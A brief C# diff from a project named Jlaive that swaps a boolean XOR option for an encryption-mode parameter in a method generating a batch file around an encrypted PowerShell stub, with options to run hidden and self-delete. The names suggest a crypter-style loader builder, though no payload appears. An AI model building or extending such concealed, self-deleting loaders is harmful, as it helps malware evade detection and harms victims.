@@ -7,9 +7,9 @@ namespace Jlaive
 {
     public class FileGen
     {
-        public static string CreateBat(byte[] key, byte[] iv, bool usexor, bool hidden, bool selfdelete, Random rng)
+        public static string CreateBat(byte[] key, byte[] iv, EncryptionMode mode, bool hidden, bool selfdelete, Random rng)
         {
-            string command = StubGen.CreatePS(key, iv, usexor, rng);
+            string command = StubGen.CreatePS(key, iv, mode, rng);
             StringBuilder output = new StringBuilder();
             output.AppendLine("@echo off");
 
